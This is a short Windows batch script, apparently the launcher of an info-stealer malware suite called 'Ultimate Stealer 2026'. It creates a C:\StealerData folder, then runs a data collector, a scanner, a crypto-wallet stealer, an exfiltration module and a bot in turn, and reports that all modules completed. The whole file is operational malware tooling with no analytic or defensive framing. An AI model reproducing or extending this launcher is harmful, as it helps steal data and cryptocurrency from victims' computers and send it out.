@echo off
title Ultimate Stealer 2026
color 0a
echo ========================================
echo    ULTIMATE STEALER - ALL MODULES
echo ========================================
echo.

mkdir "C:\StealerData" 2>nul

echo [1/5] Running Python Collector...
python main.py

echo [2/5] Running C++ Scanner...
scanner.exe

echo [3/5] Running Rust Crypto Stealer...
stealer.exe

echo [4/5] Running Nim Exfil...
exfil.exe

echo [5/5] Running Go Bot...
bot.exe

echo.
echo ========================================
echo    ALL MODULES COMPLETED SUCCESSFULLY!
echo ========================================
echo.

pause